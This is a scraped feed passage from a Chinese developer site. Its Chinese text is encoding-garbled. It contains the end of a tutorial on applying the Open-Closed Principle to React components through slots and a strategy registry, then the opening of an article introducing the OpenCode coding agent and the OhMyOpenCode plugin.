      {user.isVip &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"vip-icon"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};
</code></pre>
<p><strong>é—®é¢˜æ¥äº†ï¼š</strong></p>
<ol>
<li><strong>ç»„ä»¶è¶Šæ¥è¶Šè‡ƒè‚¿</strong>ï¼šæ¯æ¬¡æ–°éœ€æ±‚éƒ½è¦æ”¹è¿™ä¸ªæ–‡ä»¶ï¼Œä»£ç é‡è¹­è¹­æ¶¨ã€‚</li>
<li><strong>è€¦åˆåº¦æé«˜</strong>ï¼š<code>ListItem</code> ç«Ÿç„¶è¦çŸ¥é“ä»€ä¹ˆæ˜¯ VIPï¼Œä»€ä¹ˆæ˜¯åœ¨çº¿çŠ¶æ€ã€‚å¦‚æœæ˜å¤©è¦åŠ ä¸ªâ€œç­‰çº§å‹‹ç« â€ã€â€œæ´»åŠ¨æŒ‚ä»¶â€å‘¢ï¼Ÿ</li>
<li><strong>æµ‹è¯•å›°éš¾</strong>ï¼šæ¯æ¬¡æ”¹åŠ¨éƒ½å¾—æŠŠä»¥å‰çš„ VIPã€åœ¨çº¿çŠ¶æ€å…¨æµ‹ä¸€éï¼Œç”Ÿæ€•æ”¹åäº†ã€‚</li>
</ol>
<p>è¿™å°±æ˜¯å…¸å‹çš„<strong>è¿åäº†å¯¹ä¿®æ”¹å…³é—­</strong>ã€‚æ ¸å¿ƒç»„ä»¶è¢«è¿«äº†è§£å¤ªå¤šå®ƒä¸è¯¥çŸ¥é“çš„ä¸šåŠ¡é€»è¾‘ã€‚</p>
<hr/>
<h2 data-id="heading-5">é‡æ„ï¼šç”¨ OCP æŠŠâ€œå±å±±â€é“²å¹³</h2>
<p>æ€ä¹ˆè®© <code>ListItem</code> æ—¢èƒ½æ”¯æŒå„ç§èŠ±é‡Œèƒ¡å“¨çš„å±•ç¤ºï¼Œåˆä¸ç”¨æ¯æ¬¡éƒ½æ”¹å®ƒå‘¢ï¼Ÿ</p>
<p>ç­”æ¡ˆå°±æ˜¯ï¼š<strong>æŠŠå˜åŒ–çš„éƒ¨åˆ†æŠ½ç¦»å‡ºå»ï¼Œç•™ä¸‹ä¸å˜çš„éª¨æ¶ã€‚</strong></p>
<ul>
<li><strong>ä¸å˜çš„éƒ¨åˆ†</strong>ï¼šåˆ—è¡¨é¡¹çš„åŸºæœ¬ç»“æ„ï¼ˆå·¦è¾¹æ˜¯å›¾ï¼Œå³è¾¹æ˜¯æ–‡å­—ï¼‰ã€‚</li>
<li><strong>å˜åŒ–çš„éƒ¨åˆ†</strong>ï¼šå¤´åƒæ—è¾¹è¦åŠ ä»€ä¹ˆè£…é¥°ï¼Ÿæ–‡å­—åé¢è¦æŒ‚ä»€ä¹ˆé…ä»¶ï¼Ÿ</li>
</ul>
<p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ React çš„ <strong>ç»„åˆ (Composition)</strong> ç‰¹æ€§ï¼Œæ¯”å¦‚ <code>children</code> æˆ–è€… <strong>Render Props</strong>ï¼ˆæ’æ§½æ§½ä½ï¼‰ã€‚</p>
<h3 data-id="heading-6">é‡æ„ V1ï¼šä½¿ç”¨æ’æ§½ (Slots / Render Props)</h3>
<p>æˆ‘ä»¬æ”¹é€ ä¸€ä¸‹ <code>ListItem</code>ï¼Œè®©å®ƒåˆ«ç®¡é‚£ä¹ˆå¤šé—²äº‹ï¼Œåªè´Ÿè´£æä¾›â€œå‘ä½â€ã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ListItem.tsx (OCPç‰ˆæœ¬)</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">ListItemProps</span> {
  <span class="hljs-attr">avatar</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">ReactNode</span>; <span class="hljs-comment">// ä¸å†åªä¼ å­—ç¬¦ä¸²ï¼Œç›´æ¥ä¼ èŠ‚ç‚¹</span>
  <span class="hljs-attr">title</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">ReactNode</span>;  <span class="hljs-comment">// åŒä¸Š</span>
  <span class="hljs-comment">// é¢„ç•™ä¸¤ä¸ªæ‰©å±•æ§½ä½</span>
  avatarAddon?: <span class="hljs-title class_">React</span>.<span class="hljs-property">ReactNode</span>;
  titleAddon?: <span class="hljs-title class_">React</span>.<span class="hljs-property">ReactNode</span>;
}

<span class="hljs-comment">// è¿™ä¸ªç»„ä»¶ç°åœ¨ç¨³å®šå¾—ä¸€æ‰¹ï¼Œå‡ ä¹ä¸éœ€è¦å†ä¿®æ”¹äº†</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">ListItem</span> = (<span class="hljs-params">{ avatar, title, avatarAddon, titleAddon }: ListItemProps</span>) =&gt; {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"list-item"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"avatar-wrapper"</span>&gt;</span>
        {avatar}
        {/* æ‰©å±•ç‚¹ï¼šå¤´åƒè£…é¥° */}
        {avatarAddon}
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"title-wrapper"</span>&gt;</span>
        {title}
        {/* æ‰©å±•ç‚¹ï¼šæ ‡é¢˜è£…é¥° */}
        {titleAddon}
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};
</code></pre>
<p>ç°åœ¨ï¼Œæ ¸å¿ƒç»„ä»¶ <code>ListItem</code> å¯¹ä¿®æ”¹æ˜¯å…³é—­çš„ã€‚é‚£æ€ä¹ˆæ‰©å±•æ–°éœ€æ±‚å‘¢ï¼Ÿ</p>
<p><strong>åœ¨ä½¿ç”¨å®ƒçš„åœ°æ–¹è¿›è¡Œæ‰©å±•ï¼ˆå¯¹æ‰©å±•å¼€æ”¾ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini">// UserList.tsx (ä¸šåŠ¡å±‚)
import ListItem from './ListItem'<span class="hljs-comment">;</span>

const <span class="hljs-attr">UserList</span> = ({ users }) =&gt; {
  return (
    &lt;div&gt;
      {users.map(<span class="hljs-attr">user</span> =&gt; (
        &lt;ListItem
          <span class="hljs-attr">key</span>={user.id}
          // åŸºç¡€ä¿¡æ¯
          <span class="hljs-attr">avatar</span>={&lt;img src={user.avatar} /&gt;}
          <span class="hljs-attr">title</span>={&lt;span&gt;{user.name}&lt;/span&gt;}
          // æ‰©å±•éœ€æ±‚1ï¼šåœ¨çº¿çŠ¶æ€
          <span class="hljs-attr">avatarAddon</span>={user.isOnline ? &lt;<span class="hljs-literal">On</span>lineDot /&gt; : null}
          // æ‰©å±•éœ€æ±‚2ï¼šVIPæ ‡è¯†
          <span class="hljs-attr">titleAddon</span>={user.isVip ? &lt;VipCrown /&gt; : null}
        /&gt;
      ))}
    &lt;/div&gt;
  )<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>
</code></pre>
<p><strong>çœ‹ï¼ä¸–ç•Œæ¸…é™äº†ã€‚</strong></p>
<ul>
<li><code>ListItem</code> ç»„ä»¶ä¸çŸ¥é“ä¹Ÿä¸å…³å¿ƒä»€ä¹ˆæ˜¯ VIPã€‚å®ƒåªçŸ¥é“ï¼šâ€œå¦‚æœæœ‰äººç»™äº†æˆ‘ <code>titleAddon</code>ï¼Œé‚£æˆ‘å°±æŠŠå®ƒæ¸²æŸ“åœ¨æ ‡é¢˜åé¢ã€‚â€</li>
<li>å¦‚æœæ˜å¤©äº§å“è¦åŠ ä¸ªâ€œç­‰çº§å‹‹ç« â€ï¼Œä½ åªéœ€è¦å†™ä¸ª <code>&lt;LevelBadge /&gt;</code> ç»„ä»¶ï¼Œç„¶åä¼ ç»™ <code>titleAddon</code> å³å¯ã€‚<strong><code>ListItem.tsx</code> æ–‡ä»¶ä¸€ä¸ªå­—éƒ½ä¸ç”¨æ”¹ã€‚</strong></li>
</ul>
<p>è¿™å°±æ˜¯ OCP çš„é­…åŠ›ã€‚</p>
<hr/>
<h2 data-id="heading-7">è¿›é˜¶ï¼šç­–ç•¥æ¨¡å¼ä¸é…ç½®åŒ–</h2>
<p>åœ¨æ›´å¤æ‚çš„åœºæ™¯ä¸‹ï¼Œæ¯”å¦‚æˆ‘ä»¬å¼€å¤´æåˆ°çš„é€šç”¨è¡¨æ ¼ç»„ä»¶ï¼Œæ¯ä¸€åˆ—çš„æ¸²æŸ“é€»è¾‘å¯èƒ½åƒå¥‡ç™¾æ€ªã€‚è¿™æ—¶å€™å…‰ç”¨æ’æ§½å¯èƒ½è¿˜ä¸å¤Ÿçµæ´»ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥å€Ÿé‰´<strong>ç­–ç•¥æ¨¡å¼</strong>çš„æ€æƒ³ï¼Œç»“åˆé…ç½®åŒ–æ¥å®ç° OCPã€‚</p>
<p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªå¤æ‚çš„åå°ç®¡ç†è¡¨æ ¼ã€‚</p>
<h3 data-id="heading-8">ç³Ÿç³•çš„è®¾è®¡ (è¿å OCP)</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// BadTableColumn.tsx</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">renderCell</span> = (<span class="hljs-params">value, columnType</span>) =&gt; {
  <span class="hljs-comment">// åœ°ç‹± if-else </span>
  <span class="hljs-keyword">if</span> (columnType === <span class="hljs-string">'text'</span>) {
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{value}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span>;
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (columnType === <span class="hljs-string">'image'</span>) {
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">{value}</span> /&gt;</span></span>;
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (columnType === <span class="hljs-string">'link'</span>) {
    <span class="hljs-comment">// ...è¦åŠ æ–°ç±»å‹å°±å¾—æ”¹è¿™é‡Œ</span>
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (columnType === <span class="hljs-string">'status'</span>) {
     <span class="hljs-comment">// ...è¶Šæ¥è¶Šé•¿</span>
  }
  <span class="hljs-comment">// ...</span>
};
</code></pre>
<h3 data-id="heading-9">ç¬¦åˆ OCP çš„è®¾è®¡</h3>
<p>æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªç­–ç•¥æ³¨å†Œè¡¨ï¼ŒæŠŠæ¯ç§ç±»å‹çš„æ¸²æŸ“é€»è¾‘æ³¨å†Œè¿›å»ã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// renderStrategies.tsx (ç­–ç•¥å®šä¹‰)</span>
<span class="hljs-keyword">const</span> strategies = {
  <span class="hljs-attr">text</span>: <span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{value}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span>,
  <span class="hljs-attr">image</span>: <span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">{value}</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"table-img"</span> /&gt;</span></span>,
  <span class="hljs-comment">// æ–°éœ€æ±‚ï¼šçŠ¶æ€æ ‡ç­¾</span>
  <span class="hljs-attr">status</span>: <span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Tag</span> <span class="hljs-attr">color</span>=<span class="hljs-string">{value</span> === <span class="hljs-string">'active'</span> ? '<span class="hljs-attr">green</span>' <span class="hljs-attr">:</span> '<span class="hljs-attr">red</span>'}&gt;</span>{value}<span class="hljs-tag">&lt;/<span class="hljs-name">Tag</span>&gt;</span></span>,
};

<span class="hljs-comment">// æä¾›æ³¨å†Œå…¥å£ï¼ˆå¯¹æ‰©å±•å¼€æ”¾ï¼‰</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">registerStrategy</span> = (<span class="hljs-params"><span class="hljs-keyword">type</span>, renderer</span>) =&gt; {
  strategies[<span class="hljs-keyword">type</span>] = renderer;
};

<span class="hljs-comment">// æä¾›è·å–å…¥å£</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">getStrategy</span> = (<span class="hljs-params"><span class="hljs-keyword">type</span></span>) =&gt; {
  <span class="hljs-keyword">return</span> strategies[<span class="hljs-keyword">type</span>] || strategies[<span class="hljs-string">'text'</span>];
};
</code></pre>
<p>ç„¶åï¼Œè¡¨æ ¼ç»„ä»¶åªè´Ÿè´£è°ƒç”¨ç­–ç•¥ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// GoodTableColumn.tsx</span>
<span class="hljs-keyword">import</span> { getStrategy } <span class="hljs-keyword">from</span> <span class="hljs-string">'./renderStrategies'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title function_">TableCell</span> = (<span class="hljs-params">{ value, columnType }</span>) =&gt; {
  <span class="hljs-comment">// æ ¸å¿ƒç»„ä»¶å¯¹ä¿®æ”¹å…³é—­ï¼šå®ƒä¸éœ€è¦çŸ¥é“å…·ä½“æ€ä¹ˆæ¸²æŸ“</span>
  <span class="hljs-keyword">const</span> renderer = <span class="hljs-title function_">getStrategy</span>(columnType);
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>{renderer(value)}<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span>;
};
</code></pre>
<p>å½“ä½ è¦æ–°å¢ä¸€ç§â€œè¿›åº¦æ¡â€ç±»å‹çš„åˆ—æ—¶ï¼Œä½ æ ¹æœ¬ä¸éœ€è¦ç¢° <code>TableCell</code> ç»„ä»¶ï¼Œåªéœ€è¦åœ¨é¡¹ç›®çš„å…¥å£æ–‡ä»¶é‡Œæ³¨å†Œä¸€ä¸ªæ–°çš„ç­–ç•¥ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// main.js (åº”ç”¨å…¥å£)</span>
<span class="hljs-keyword">import</span> { registerStrategy } <span class="hljs-keyword">from</span> <span class="hljs-string">'./renderStrategies'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ProgressBar</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./components/ProgressBar'</span>;

<span class="hljs-comment">// æ‰©å±•æ–°èƒ½åŠ›</span>
<span class="hljs-title function_">registerStrategy</span>(<span class="hljs-string">'progress'</span>, <span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ProgressBar</span> <span class="hljs-attr">percent</span>=<span class="hljs-string">{value}</span> /&gt;</span></span>);
</code></pre>
<p>è¿™å°±å®ç°äº†ä¸€ä¸ªç®€æ˜“çš„æ’ä»¶åŒ–ç³»ç»Ÿã€‚æ ¸å¿ƒåº“ç¨³å®šä¸å˜ï¼Œä¸šåŠ¡æ–¹é€šè¿‡æ³¨å†Œæœºåˆ¶æ— é™æ‰©å±•èƒ½åŠ›ã€‚</p>
<hr/>
<h2 data-id="heading-10">æ€»ç»“ï¼šåˆ«è®©è‡ªå·±æˆä¸ºâ€œæ”¹Bugæœºå™¨â€</h2>
<p>å¼€é—­åŸåˆ™ä¸æ˜¯ä»€ä¹ˆé«˜æ·±çš„ç†è®ºï¼Œå®ƒå°±æ˜¯ä¸ºäº†è®©ä½ å°‘åŠ ç­ã€å°‘èƒŒé”…è€Œç”Ÿçš„ã€‚</p>
<p><strong>è®°ä½è¿™å‡ ä¸ªå®æˆ˜è¦ç‚¹ï¼š</strong></p>
<ol>
<li><strong>è¯†åˆ«å˜åŒ–ç‚¹</strong>ï¼šåšç»„ä»¶ä¹‹å‰å…ˆæƒ³æƒ³ï¼Œå“ªäº›æ˜¯é“æ‰“ä¸åŠ¨çš„éª¨æ¶ï¼Œå“ªäº›æ˜¯æµæ°´æ˜“å˜çš„çš®è‚‰ã€‚</li>
<li><strong>å¤šç”¨ç»„åˆ/æ’æ§½</strong>ï¼šReact çš„ <code>children</code> å’Œ Render Propsï¼ŒVue çš„ <code>slot</code>ï¼Œéƒ½æ˜¯å®ç° OCP çš„åˆ©å™¨ã€‚æŠŠå†³å®šæƒäº¤ç»™ä½¿ç”¨è€…ï¼Œè€Œä¸æ˜¯è‡ªå·±å¤§åŒ…å¤§æ½ã€‚</li>
<li><strong>å–„ç”¨ç­–ç•¥/é…ç½®</strong>ï¼šé‡åˆ°å¤æ‚çš„ <code>if-else</code> é€»è¾‘åˆ¤æ–­æ¸²æŸ“ç±»å‹æ—¶ï¼Œè€ƒè™‘ç”¨æ˜ å°„è¡¨ï¼ˆMap å¯¹è±¡ï¼‰ä»£æ›¿ç¡¬ç¼–ç ï¼ŒæŠŠé€»è¾‘æŠ½ç¦»å‡ºå»ã€‚</li>
</ol>
<p>ä¸‹æ¬¡å†é‡åˆ°äº§å“ç»ç†ä¸æ–­ææ–°éœ€æ±‚ï¼Œå¸Œæœ›ä½ èƒ½è‡ªä¿¡åœ°æ‰“å¼€ä»£ç ï¼Œä¼˜é›…åœ°æ–°å¢ä¸€ä¸ªæ–‡ä»¶ï¼Œè€Œä¸æ˜¯ç—›è‹¦åœ°åœ¨é‚£å¨å‡ åƒè¡Œçš„ç¥–ä¼ ä»£ç é‡ŒåŠ  <code>if-else</code>ã€‚</p>
<p>Keep coding, keep open!</p>
<hr/>
<blockquote>
<p><strong>äº’åŠ¨è¯é¢˜</strong></p>
<p>ä½ çš„é¡¹ç›®é‡Œæœ‰æ²¡æœ‰é‚£ç§å› ä¸ºè¿å OCP è€Œå˜å¾—ç»´æŠ¤å›°éš¾çš„â€œè¶…çº§ç»„ä»¶â€ï¼Ÿä½ åˆæ˜¯æ€ä¹ˆé‡æ„å®ƒçš„ï¼Ÿæ¬¢è¿åœ¨è¯„è®ºåŒºåæ§½äº¤æµï¼</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[OpenCodeçœŸçš„å¯ä»¥æŒ‘æˆ˜Claude Code]]></title>    <link>https://juejin.cn/post/7592996072705179698</link>    <guid>https://juejin.cn/post/7592996072705179698</guid>    <pubDate>2026-01-09T03:46:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592996072705179698" data-draft-id="7592906873089343534" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="OpenCodeçœŸçš„å¯ä»¥æŒ‘æˆ˜Claude Code"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-09T03:46:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤§æ©™å­æ‰“æ¸¸æˆ"/> <meta itemprop="url" content="https://juejin.cn/user/1081575170907086"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            OpenCodeçœŸçš„å¯ä»¥æŒ‘æˆ˜Claude Code
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1081575170907086/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤§æ©™å­æ‰“æ¸¸æˆ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:46:33.000Z" title="Fri Jan 09 2026 03:46:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ç”¨ OpenCode ç»“åˆ OhMyOpenCodeï¼šåœ¨ VS Code ä¸ Trae ä¸­çš„é«˜æ•ˆå¼€å‘å®æˆ˜ï¼ˆå«æˆªå›¾ä¸é…ç½®ï¼‰</h2>
<blockquote>
<p>2026 å¹´å¼€å‘è€…çš„ç»ˆç«¯ç¼–ç¨‹åˆ©å™¨ï¼šä»å®‰è£…åˆ° Multiâ€‘Agent å·¥ä½œæµå…¨è§£æ</p>
</blockquote>
<h3 data-id="heading-1">æ¦‚è¿°ï¼šOpenCode + OhMyOpenCode åœ¨ IDE ä¸­çš„æ•ˆç‡é£è·ƒ</h3>
<p>åœ¨ 2026 å¹´çš„ä»Šå¤©ï¼ŒAI ç¼–ç¨‹å·¥å…·å·²ç»ä»ç®€å•çš„ä»£ç è¡¥å…¨è¿›åŒ–ä¸ºèƒ½å¤Ÿç‹¬ç«‹æ‰§è¡Œå¤æ‚ä»»åŠ¡çš„æ™ºèƒ½ä½“ï¼ˆAgentï¼‰ã€‚OpenCode ä½œä¸ºè¿™ä¸€é¢†åŸŸçš„å¼€æºé¢†è·‘è€…ï¼Œå‡­å€Ÿå…¶å¼ºå¤§çš„ CLIï¼ˆå‘½ä»¤è¡Œç•Œé¢ï¼‰ä¸ TUIï¼ˆç»ˆç«¯ç”¨æˆ·ç•Œé¢ï¼‰äº¤äº’æ¨¡å¼ï¼Œæ­£åœ¨é‡æ–°å®šä¹‰å¼€å‘è€…çš„å·¥ä½œæµã€‚è€Œ OhMyOpenCode ä½œä¸ºå…¶æœ€å¼ºä¼´ä¾£ï¼Œé€šè¿‡æ’ä»¶åŒ–æœºåˆ¶è¿›ä¸€æ­¥é‡Šæ”¾äº† Multiâ€‘Agent çš„åä½œæ½œåŠ›ã€‚</p>
<ul>
<li>OpenCode æ˜¯ä»€ä¹ˆï¼Ÿä¸€æ¬¾ 100% å¼€æºçš„ AI ç¼–ç¨‹ä»£ç†ï¼Œæ—¢å¯ä»¥åœ¨ç»ˆç«¯ç‹¬ç«‹è¿è¡Œï¼Œä¹Ÿèƒ½ä½œä¸º IDE æ’ä»¶é›†æˆã€‚å®ƒæ”¯æŒ GLMâ€‘4.7ã€MiniMaxã€Grok Code ç­‰å¤šç§æ¨¡å‹ï¼Œä¸»æ‰“ â€œç»ˆç«¯å³å…¥å£â€ çš„é«˜æ•ˆäº¤äº’ä½“éªŒï¼Œèƒ½å¤Ÿç›´æ¥æ“ä½œæ–‡ä»¶ç³»ç»Ÿã€æ‰§è¡Œ Shell å‘½ä»¤å¹¶è¿›è¡Œä»£ç é‡æ„ã€‚</li>
